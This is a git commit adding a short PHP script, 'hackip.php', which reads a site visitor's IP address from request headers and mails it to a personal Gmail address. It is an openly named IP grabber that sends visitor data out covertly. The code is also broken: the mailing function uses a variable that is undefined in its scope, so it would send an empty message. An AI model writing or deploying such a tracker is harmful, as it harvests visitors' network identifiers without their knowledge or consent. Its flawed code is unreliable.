9082f22ab4390d0993e8d56b68152efc03e8693d
GeIl <96978697+GeLit3@users.noreply.github.com>
2022-02-28 19:06:35 +0200

    Add files via upload

---
+++ hackip.php
@@ -0,0 +1,25 @@
+<?PHP
+	
+	echo get_ip();
+	echo send_ip();
+	
+	
+	
+	function get_ip()
+	{
+	$value = '';
+	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+		$value = $_SERVER['HTTP_CLIENT_IP'];
+	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+		$value = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
+		$value = $_SERVER['REMOTE_ADDR'];
+	}
+  
+	return $value;
+	}
+	
+	function send_ip()
+	{
+	mail("obzortovarov7@gmail.com", "IPGITHUBNICE!", $value);
+	}
